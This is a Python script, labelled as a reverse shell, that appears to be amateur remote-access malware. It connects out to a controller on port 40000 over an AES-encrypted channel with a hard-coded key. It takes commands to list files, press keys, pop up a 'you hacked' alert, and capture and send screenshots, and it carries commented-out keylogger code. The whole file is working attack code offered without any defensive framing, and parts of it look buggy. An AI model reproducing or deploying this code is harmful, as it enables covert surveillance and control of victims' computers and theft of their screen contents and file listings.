# reverse shell
import socket, pyautogui, time, base64, os, traceback
import threading
# from pynput import keyboard
import keyboard
from Crypto.Cipher import AES

# HOST = '211.229.218.12'
HOST = ''
PORT = 40000
BUFSIZE = 1024
ADDR = (HOST, PORT)
isActive = False
keys = []

EncodeAES = lambda c, s: base64.b64encode(c.encrypt(s))
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e))

secret = "HUISA78sa9y&9syYSsJhsjkdjklfs9aR"

# c = socket.socket(socket.AF_INET, socket.SOCK_STREAM

# def backdoor():

#         while True:          
#                 key = conn.recv(1024)
#                 print(f'{key.decode()}')
#                 # conn.sendall(key)
#                 if key == keyboard.Key.esc:
#                         conn.close()
#                         break
#                 time.sleep(1)

def Send(sock, cmd, end="EOFEOFEOFEOFEOFX"):
        sock.sendall(EncodeAES(cipher, cmd + end))

def Receive(sock, end=("EOFEOFEOFEOFEOFX").encode()):
        data = str("").encode()
        l = sock.recv(1024)
        while(l):
                decrypted = DecodeAES(cipher, l)
                data = bytes(data + decrypted)
                if data.endswith(end) == True:
                        break
                else:
                        l = sock.recv(1024)
        return data[:-len(end)]
        
        
        

# def on_press(key):
#     try:
#         keys.clear()
#         print('key {0} pressed'.format(key.char))
#         keys.append(key)
#     except AttributeError:
#         keys.clear()
#         print('special key {0} pressed'.format(key))
#         keys.append(key)
            
# def on_release(key):
#     print('{0} released'.format(key))
#     if key == keyboard.Key.esc:
#         isActive = False
#         # stop listener
#         return False

# # with keyboard.Listener(
# # on_press = on_press,
# # on_release = on_release) as listener:
# #         listener.join()  

# listener = keyboard.Listener(
#         on_press = on_press,
#         on_release=on_release)


while True:
        try:
                
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((HOST,PORT))      
                                
                cipher = AES.new(secret,AES.MODE_CFB,'0000000000000000')

                data = Receive(s)
                
                print("data", data)
                print(data.startswith(("Activate").encode()))
                if data.startswith(("Activate").encode()) == True:
                        isActive = True
                
                
                time.sleep(0.3)
                print(isActive)
                while isActive:
                        try:                                
                                data = Receive(s)
                                print("cmd: ", data)
                        
                        except:
                                print("disconnected")
                                s.close()
                                isActive = False
                                break
                        # thread = Thread(target = listener.start())
                        # thread.start()
                        
                        if data.startswith(("quit").encode()) == True:
                                Send(s, "quit")
                                print("quit")
                                s.close()
                                exit(0)
                        elif data.startswith(("ls").encode()) == True:
                                Send(s, str(os.listdir()))
                        elif data.startswith(("up").encode()) == True: 
                                pyautogui.press('up')
                        elif data.startswith(("down").encode()) == True:
                                pyautogui.press('down')
                        elif data.startswith(("left").encode()) == True:
                                pyautogui.press('left')
                        elif data.startswith(("right").encode()) == True:
                                pyautogui.press('right')
                        elif data.startswith(("hacked").encode()) == True:
                                pyautogui.alert('you hacked')
                        elif data.startswith(("screen shot").encode()) == True:
                                im = pyautogui.screenshot('./screen_shot')
                                f = open('./screen_shot','rb')
                                file_data = str(f.read())
                                Send(s, file_data, "")      
 
        except Exception as e:
                err_msg = traceback.format_exc()
                print(err_msg)
                print(e)
                exit(0)


